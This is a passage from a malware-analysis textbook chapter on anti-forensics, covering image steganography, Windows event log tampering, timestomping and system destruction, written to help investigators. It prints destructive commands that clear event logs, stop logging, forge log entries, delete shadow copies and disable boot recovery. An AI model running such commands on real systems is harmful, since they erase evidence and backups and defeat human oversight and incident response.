<p class="TX">Early examples of malware that used steganography techniques include the Duqu malware family from 2011, which gathered information from victim systems and stored it in a JPEG image file, and the Zeus banking trojan from 2014, which hid C2 commands in images that it sent to victims. A more recent example is an attack discovered by ESET researchers and dubbed “Stegano,” which featured exploit code embedded in images on various websites. The malicious code may have gone undetected by network defenses due to the way it was hidden in the image data (see Daniel Goodin’s article “Millions Exposed to Malvertising That Hid Attack Code in Banner Pixels” at <a href="https://arstechnica.com/information-technology/2016/12/millions-exposed-to-malvertising-that-hid-attack-code-in-banner-pixels/"><i>https://<wbr/>arstechnica<wbr/>.com<wbr/>/information<wbr/>-technology<wbr/>/2016<wbr/>/12<wbr/>/millions<wbr/>-exposed<wbr/>-to<wbr/>-malvertising<wbr/>-that<wbr/>-hid<wbr/>-attack<wbr/>-code<wbr/>-in<wbr/>-banner<wbr/>-pixels<wbr/>/</i></a>).</p>&#13;
<p class="TX">Malware can leverage steganography for many reasons, such as to hide data and malicious code from investigators, to obfuscate C2 commands in transit, or to mask data that will be exfiltrated from the victim network. There are a few different ways in which it can do this, including file appending and bit manipulation. <i>File appending</i>, as its name implies, is simply adding one file to the end of another, in a sort of piggybacking manner. As an example, if I were investigating a JPEG file that I suspected has been tampered with, I might inspect the headers of the file in a hex editor (see <a href="chapter15.xhtml#fig15-7">Figure 15-7</a>).</p>&#13;
<figure class="IMG"><img class="img80" id="fig15-7" src="../images/fig15-7.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-7: A JPEG file header</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX">This header is standard for a JPEG (which is <samp class="SANS_TheSansMonoCd_W5Regular_11">JFIF</samp> in the figure) file type. Further analysis of the file data reveals the anomaly shown in <a href="chapter15.xhtml#fig15-8">Figure 15-8</a>.</p>&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_310" aria-label="310"/>&#13;
<figure class="IMG"><img class="img100" id="fig15-8" src="../images/fig15-8.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-8: A file header hidden inside the JPEG file</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Notice the <samp class="SANS_TheSansMonoCd_W5Regular_11">PK</samp> in this figure. This is the standard header for a ZIP archive file, indicating that a ZIP file may have been appended to the JPEG image! To extract this file and examine its contents, we could take a few approaches. First, we could “carve” the embedded ZIP out of this image file using a hex editor. This involves simply copying the suspect data from the file and dumping it to a new file. An alternative and simpler approach is using the free Binwalk utility (<a href="https://github.com/ReFirmLabs/binwalk"><i>https://<wbr/>github<wbr/>.com<wbr/>/ReFirmLabs<wbr/>/binwalk</i></a>). Binwalk “walks” an input file, searching for signs of other embedded files, and can automatically carve out these files. <a href="chapter15.xhtml#fig15-9">Figure 15-9</a> shows Binwalk being used to extract a hidden executable file (<i>surprise.exe</i>) from a ZIP container embedded in the JPEG image.</p>&#13;
<figure class="IMG"><img class="img100" id="fig15-9" src="../images/fig15-9.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-9: Carving out embedded files with Binwalk</samp></p></figcaption>&#13;
</figure>&#13;
<blockquote>&#13;
<p class="Note"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp></span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>You can find this malware sample in MalShare or VirusTotal with the following hash:</i></p>&#13;
<blockquote>&#13;
<p class="NoteCodeSpaceAbove1">SHA256: 0cfcf571748f0d0c3bcedead2508f0bec329558c29017e7093a138853cc0e17e</p>&#13;
</blockquote>&#13;
<p class="TX">This is a rather simple example of steganography. Modern attacks, however, generally use more complex techniques, such as <i>bit manipulation</i>, or rearranging or modifying bits to evade detection. For example, the individual bits in an image file could be manipulated to covertly store malicious code without affecting the quality of the image. <a href="chapter15.xhtml#fig15-10">Figure 15-10</a> shows an excerpt of the data from an unaltered image file, viewed in a hex editor.</p>&#13;
<figure class="IMG"><img class="img80" id="fig15-10" src="../images/fig15-10.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-10: A hex dump of the unaltered image</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX">However, this image has now been deviously manipulated by a threat actor, as you can see in <a href="chapter15.xhtml#fig15-11">Figure 15-11</a>.</p>&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_311" aria-label="311"/>&#13;
<figure class="IMG"><img class="img80" id="fig15-11" src="../images/fig15-11.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-11: A hex dump of the altered image</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX">The last (16th) byte of each row has been manipulated. If a malware sample were to load this image file for reading (using <samp class="SANS_TheSansMonoCd_W5Regular_11">ReadFile</samp>, for example), it could specifically extract these suspect bytes from the image file, as the following pseudocode does:</p>&#13;
<pre class="pre-158"><code><var>--snip--</var>&#13;
call ReadFile          ; Open manipulated image file.&#13;
<var>--snip--</var>&#13;
mov edx, [esp+file+16] ; Move the first 16th byte into EDX.&#13;
mov [ebx+data], edx    ; Store the byte in memory.&#13;
xor edx, edx           ; Clear EDX.&#13;
mov edx, [esp+file+36] ; Move the second 16th byte into EDX.&#13;
mov [ebx+data+2], edx  ; Store the second byte in memory.&#13;
<var>--snip--</var></code></pre>&#13;
<p class="TX">Once all bytes are stored in memory, they add up to the byte string <samp class="SANS_TheSansMonoCd_W5Regular_11">"89 E9 8D 55 05 FF D0"</samp>. Converting this byte string to x86 code reveals the following assembly code, which is likely to be some sort of shellcode:</p>&#13;
<pre class="pre-159"><code>mov   ecx, ebp&#13;
lea   edx, [ebp + 0x5]&#13;
call  eax</code></pre>&#13;
<p class="TX">Finally, the <i>least significant bit (LSB)</i> technique involves tampering with specific bits inside a file. To illustrate this steganography technique, let’s say an image file has the following set of 8 bytes, each representing a pixel in the image:</p>&#13;
<pre class="pre-160"><code>11101101 11000110 10100111 10010110&#13;
10111001 10011001 10001100 11000110</code></pre>&#13;
<p class="TX">In some image-encoding formats, such as bitmap (BMP), the LSB, or the last bit in each byte, can be modified without greatly affecting the image. So, if an attacker wanted to hide malicious code inside this image, they could tamper with the LSBs and form a new string of bits. Let’s imagine that an attacker modified a select few of the LSBs (shown in bold):</p>&#13;
<pre class="pre-161"><code>1110110<b>0</b> 1100011<b>0</b> 1010011<b>0</b> 1001011<b>1</b>&#13;
1011100<b>1</b> 1001100<b>0</b> 1000110<b>0</b> 1100011<b>1</b></code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_312" aria-label="312"/>If we combine all the LSBs into a new byte, we get this:</p>&#13;
<pre class="pre-162"><code>00011001</code></pre>&#13;
<p class="TX">This byte in and of itself doesn’t mean much to us. However, if the attacker were able to modify large amounts of LSBs in an image, they could effectively hide malicious code or data inside this image. Malware could hold pieces of its malicious code or configuration inside an image, using the LSBs as temporary storage.</p>&#13;
<p class="TX">As a final note, there are many open source and publicly available toolkits, such as Steghide (<a href="https://steghide.sourceforge.net/documentation.php"><i>https://<wbr/>steghide<wbr/>.sourceforge<wbr/>.net<wbr/>/documentation<wbr/>.php</i></a>), for easy implementation of steganography techniques. It’s worth looking into these tools to better understand how steganography works and how it can be abused by malware authors to hide malicious code and data.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec24">&#13;
&#13;
<h4 class="H2" id="sec24"><span id="h-255"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Tampering with Logs and Evidence</samp></h4>&#13;
<p class="TNI1">During an investigation, logs and other metadata can serve as valuable evidence that a specific malicious event did or did not occur, so altering or removing them will hamper the detection, response, and analysis process. For this reason, logs and related metadata can be prime targets for evasive malware that seeks to hide its activities from investigators. In this section, we’ll look at two tampering techniques: log tampering and timestomping.</p>&#13;
<section epub:type="division" aria-labelledby="sec25">&#13;
&#13;
<h5 class="H3" id="sec25"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Windows Event Log Tampering</samp></h5>&#13;
<p class="TNI1"><i>Log tampering</i> involves altering or deleting entries from logs on the host that may give away the malware’s presence. One type of log source that an attacker might tamper with is <i>Windows event logs</i>, which contain information about various Windows and application events and are thus great sources of data for investigators. <a href="chapter15.xhtml#fig15-12">Figure 15-12</a> shows the Windows Event Viewer, a built-in Windows utility for exploring event logs.</p>&#13;
<figure class="IMG"><img class="img100" id="fig15-12" src="../images/fig15-12.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-12: Viewing system event logs in the Windows Event Viewer</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_313" aria-label="313"/>Windows event logs have a common structure that includes the following information:</p>&#13;
<ul class="ul">&#13;
<li class="BL">An <i>event ID</i> denoting the type of event that occurred</li>&#13;
<li class="BL">A <i>timestamp</i> indicating the date and time of that event</li>&#13;
<li class="BL">The <i>source</i> of the event, such as the specific software or component that triggered it</li>&#13;
<li class="BL">A <i>description</i> of the event</li>&#13;
</ul>&#13;
<p class="TX">Additionally, each event has a level assigned to it:</p>&#13;
<ul class="ul">&#13;
<li class="BL"><i>Informational</i>, for general messages such as information about a software package being installed or uninstalled</li>&#13;
<li class="BL"><i>Warnings</i>, for events that could indicate an issue that should be addressed</li>&#13;
<li class="BL"><i>Errors</i>, for events such as application crashes</li>&#13;
<li class="BL"><i>Critical</i>, for events that are detrimental to the functioning of the system</li>&#13;
</ul>&#13;
<p class="TX">Windows can capture many different event types. Three of the most common log types are <i>system</i> logs (for events related to the system and its components), <i>application</i> logs (for events related to Windows and third-party applications and services), and <i>security</i> logs (for events related to security, such as authentication). Naturally, there are some event types that security analysts and investigators should pay special attention to, as they can offer clues about how a system was compromised or what actions malware took on the system. <a href="chapter15.xhtml#tab15-3">Table 15-3</a> lists a small subset of these events.</p>&#13;
<p class="TT" id="tab15-3"><span class="Heavy"><samp class="SANS_Futura_Std_Heavy_B_11">Table 15-3:</samp></span> <samp class="SANS_Futura_Std_Book_11">Event Types of Interest to Security Analysts and Investigators</samp></p>&#13;
<table class="Basic-Table">&#13;
<thead>&#13;
<tr>&#13;
<th class="TCH" scope="col"><p class="TCH1"><samp class="SANS_Futura_Std_Heavy_B_11">Windows event ID</samp></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><samp class="SANS_Futura_Std_Heavy_B_11">Description</samp></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td class="TBF"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">4624</samp></p></td>&#13;
<td class="TBF"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">An account successfully authenticated (logged in to) Windows. The log records important information such as the account’s username and source IP address.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">4625</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">There was a failed login attempt.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">4688</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">A process was started. The log records details such as the process’s name and which account initiated the process.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">4689</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">A process was terminated.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">4698</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">A scheduled task was created.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">4703</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">Token privileges were enabled or disabled for an account. Investigators can use this to potentially identify privilege elevation and impersonation attempts.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">4946</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">A Windows firewall rule was added.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">5140</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">A network share was accessed. Information such as the user’s account and IP address is logged, as well as what type of access permissions the user requested (such as Read or Write).</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TBL"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">7045</samp></p></td>&#13;
<td class="TBL"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">A service was installed on the system. The log records information such as the service’s name and image path (for example, its executable on disk).</samp></p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_314" aria-label="314"/>Since logs of these events can be valuable to a forensics investigator, it makes sense that clearing or tampering with these event logs can in turn be valuable for a malware author.</p>&#13;
<p class="TX">One of the simplest methods of tampering with logs is simply deleting, or clearing, them. To clear these event logs, malware can invoke the Windows utility Wevtutil. The following commands will wipe the system, application, and security event logs, respectively, on the victim system:</p>&#13;
<pre class="pre-163"><code>C:\&gt; wevtutil cl system&#13;
C:\&gt; wevtutil cl application&#13;
C:\&gt; wevtutil cl security</code></pre>&#13;
<p class="TX">Or the malware can use a PowerShell command, such as this:</p>&#13;
<pre class="pre-164"><code>PS C:\&gt; Remove-EventLog -LogName Security</code></pre>&#13;
<p class="BodyContinued">This command scrubs all Windows security event logs.</p>&#13;
<p class="TX">Malware can even disable event logging completely during an attack by invoking PowerShell to stop the Windows Event Logging service, like so:</p>&#13;
<pre class="pre-165"><code>PS C:\&gt; Stop-Service -Name EventLog -Force</code></pre>&#13;
<p class="TX">Keep in mind that deleting logfiles or stopping logging can be quite noisy, especially if the victim organization is specifically monitoring for log-tampering techniques. Another approach is manually writing new Windows event logs to throw off investigators. By creating an event for a fictitious login or for the deletion or creation of an imaginary file, for example, the malware author can create a “red herring” scenario. They can accomplish this with the PowerShell cmdlet <samp class="SANS_TheSansMonoCd_W5Regular_11">Write-EventLog</samp>:</p>&#13;
<pre class="pre-166"><code>PS C:\&gt; Write-EventLog -LogName $eventLog -Source $eventSource -EventId&#13;
$eventId -EntryType Information -Message $eventMessage</code></pre>&#13;
<p class="TX">Windows events are stored as <i>.evtx</i> files inside the <i>C:\Windows\System32\winevt\Logs</i> directory. You can see an example directory listing in the following output:</p>&#13;
<pre class="pre-167"><code>C:\Users&gt;dir C:\Windows\System32\winevt\Logs&#13;
&#13;
<var>--snip--</var>&#13;
07/27/2023 04:15 AM  3,215,360 Application.evtx&#13;
07/27/2023 02:14 PM  4,096 DebugChannel.etl&#13;
08/14/2020 10:18 AM  69,632 HardwareEvents.evtx&#13;
08/14/2020 10:18 AM  69,632 Internet Explorer.evtx&#13;
08/14/2020 10:18 AM  69,632 Key Management Service.evtx&#13;
<var>--snip--</var></code></pre>&#13;
<p class="TX">Each <i>.evtx</i> file in this output represents a certain type of logging event, such as application events, hardware events, and Internet Explorer events. You may spot malware specifically referencing this directory location in its <span role="doc-pagebreak" epub:type="pagebreak" id="pg_315" aria-label="315"/>code. This can be a telltale sign that the malware is attempting to tamper with these files, such as in the following code:</p>&#13;
<pre class="pre-168"><code><var>--snip--</var>&#13;
mov edx,0x1&#13;
<span class="CodeAnnotationHang1" aria-label="annotation1">❶</span> mov ecx, "C:\Windows\System32\winevt\Logs"&#13;
push eax&#13;
<span class="CodeAnnotationHang1" aria-label="annotation2">❷</span> call encrypt_data&#13;
<var>--snip--</var></code></pre>&#13;
<p class="TX">This malware code references the path <i>C:\Windows\System32\winevt\Logs</i> <span class="CodeAnnotation" aria-label="annotation1">❶</span> and then calls a function that encrypts this data (which I have named <samp class="SANS_TheSansMonoCd_W5Regular_11">encrypt_data</samp>) <span class="CodeAnnotation" aria-label="annotation2">❷</span>, effectively destroying these files.</p>&#13;
<p class="TX">Furthermore, malware may be able to directly modify <i>.evtx</i> files to hide malicious activity. This can be a delicate process, and it involves shutting down the event-logging services, tampering with the event files, and recalculating a checksum that serves as a sort of integrity check. This technique is outside the scope of this book, but you can read more about it in the <i>Medium</i> blog post “Event Log Tampering Part 2: Manipulating Individual Event Logs,” at <a href="https://svch0st.medium.com/event-log-tampering-part-2-manipulating-individual-event-logs-3de37f7e3a85"><i>https://<wbr/>svch0st<wbr/>.medium<wbr/>.com<wbr/>/event<wbr/>-log<wbr/>-tampering<wbr/>-part<wbr/>-2<wbr/>-manipulating<wbr/>-individual<wbr/>-event<wbr/>-logs<wbr/>-3de37f7e3a85</i></a>.</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp></span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>While I was writing this book, Kaspersky reported on a malware variant that writes malicious code into Windows event logs and executes the code in memory directly from the logs themselves. This technique combines event log tampering techniques with memory-resident techniques. You can read more about this in Denis Legezo’s post “A New Secret Stash for ‘Fileless’ Malware” on the Kaspersky blog at</i> <a href="https://securelist.com/a-new-secret-stash-for-fileless-malware/106393/"><span class="note_LinkURL_Italic">https://securelist.com/a-new-secret-stash-for-fileless-malware/106393/</span></a>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec26">&#13;
&#13;
<h5 class="H3" id="sec26"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Timestomping</samp></h5>&#13;
<p class="TNI1"><i>Timestomping</i> is a technique used to mislead forensics investigators by modifying file timestamps. In the NTFS (the default filesystem in modern versions of Windows), a timestamp is represented as a 64-bit integer (more formally called a <i>filetime structure</i>) that equates to the number of 100-nanosecond intervals, or ticks, since January 1, 1601, UTC time. This sounds quite complicated, but the important thing to know is that, when converted to a human-readable format, this integer represents a specific date and time. For example, the timestamp integer <samp class="SANS_TheSansMonoCd_W5Regular_11">133346988430000000</samp> can be converted to the human-readable string of <samp class="SANS_TheSansMonoCd_W5Regular_11">Monday, July 24, 2023 7:00:43 PM</samp>. Internally, Windows uses the function <samp class="SANS_TheSansMonoCd_W5Regular_11">FileTimeToSystemTime</samp> to make this conversion. The NTFS format keeps track of file and directory timestamps for when a file or directory is written to or otherwise modified, accessed (opened and read), or created (or copied, moved, and so on), as well as when a file or directory’s metadata has changed. Metadata can include the file or directory’s name, attributes, permissions, and other data. You can read more about the filetime structure format here: <a href="https://www.ntfs.com/exfat-time-stamp.htm"><i>https://<wbr/>www<wbr/>.ntfs<wbr/>.com<wbr/>/exfat<wbr/>-time<wbr/>-stamp<wbr/>.htm</i></a>.</p>&#13;
<p class="TX">To modify these filetime timestamps in an effort to mislead investigators, malware can use a WinAPI function designed specifically for this use <span role="doc-pagebreak" epub:type="pagebreak" id="pg_316" aria-label="316"/>case: <samp class="SANS_TheSansMonoCd_W5Regular_11">SetFileTime</samp>. The <samp class="SANS_TheSansMonoCd_W5Regular_11">SetFileTime</samp> function accepts three parameters: the file creation time (<samp class="SANS_TheSansMonoCd_W5Regular_11">lpCreationTime</samp>), the last access time (<samp class="SANS_TheSansMonoCd_W5Regular_11">lpLastAccessTime</samp>), and the last modified time (<samp class="SANS_TheSansMonoCd_W5Regular_11">lpLastWriteTime</samp>). Malware can use the functions <samp class="SANS_TheSansMonoCd_W5Regular_11">SetFileInformationByHandle</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">NtSetInformationFile</samp> similarly to tamper with either its own timestamps or those of other files and directories.</p>&#13;
<p class="TX">During the forensics investigation process, it is very common for investigators to create a timeline of all filesystem events. File timestamp metadata and logs are often part of these timelines. If malware employs timestomping and log tampering techniques, this investigation timeline will be inaccurate, causing a delay in the investigation process at best and an unresolved case at worst. For forensics investigations that must be defended in court, the consequences can be especially severe.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec27">&#13;
&#13;
<h4 class="H2" id="sec27"><span id="h-256"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Destroying the System</samp></h4>&#13;
<p class="TNI1">Perhaps the most permanent and destructive technique for hiding evidence is total system destruction. You might be wondering why an attacker would wish to destroy a system to cover up evidence, as this would surely alert the victim user or organization to the attack. While this is true, it’s still the most permanent and absolute method of covering up evidence of an attack. If the system is destroyed, there’s a good chance it will put a halt to the investigation. This is also a way to avoid attribution of the attack.</p>&#13;
<p class="TX">To destroy evidence of the attack, the malware could encrypt the entire disk and the master boot record (MBR), rendering the system unbootable, similar to how some ransomware operates. The primary difference here is that the attacker would destroy the encryption and decryption keys, as they’re not required anymore. Or the malware could overwrite sections of the disk with random data to achieve a similar effect.</p>&#13;
<p class="TX">The malware could also disable utilities that would otherwise allow investigators to recover the system, such as Windows Startup Repair, or delete all backups. These are some of the commands it might run as a precursor to a destructive attack:</p>&#13;
<pre class="pre-169"><code>C:\&gt; C:\Windows\System32\vssadmin.exe delete shadows /all /quiet&#13;
C:\&gt; C:\Windows\System32\bcdedit.exe /set bootstatuspolicy ignoreallfailures&#13;
C:\&gt; C:\Windows\System32\bcdedit.exe /set recoveryenabled No</code></pre>&#13;
<p class="TX">The first command deletes all volume shadow copies, a backup feature in Windows that allows copies of files to be restored. Deleting these backups prevents investigators from retrieving evidence stored as shadow copies. The second and third commands prevent Windows from booting into recovery mode, which is an approach sometimes used by investigators or system administrators to recover the system.</p>&#13;
<p class="TX">Complete system destruction for the sole purpose of anti-forensics is rare. It’s much more common for malware to have a primary goal of destroying systems and data for the purpose of service disruption, with anti-forensics only as a secondary goal. For example, the malware family <span role="doc-pagebreak" epub:type="pagebreak" id="pg_317" aria-label="317"/>Shamoon destroyed data on the target systems, which, as a by-product, may have hindered investigation efforts. HermeticWiper (briefly covered in <span class="Xref"><a href="chapter14.xhtml">Chapter 14</a></span>) is another example.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec28">&#13;
&#13;
<h3 class="H1" id="sec28"><span id="h-257"/><samp class="SANS_Futura_Std_Bold_B_11">Summary</samp></h3>&#13;
<p class="TNI1">In this chapter, you saw how fileless attacks work and how malware authors leverage memory- and registry-resident malware to achieve their goal without leaving obvious evidence behind. You also learned how threat actors can abuse native and signed Windows binaries (LOLBins) to covertly execute malicious code in order to bypass security controls such as AppLocker or support fileless attacks. We then delved deeper into the topic of hiding evidence by exploring some anti-forensics techniques that malware employs to cover its tracks and further impede investigation efforts. In the next chapter, we’ll dive into how malware evades detection using encoding and encryption.</p>&#13;
</section>&#13;
</section>&#13;
</body></html>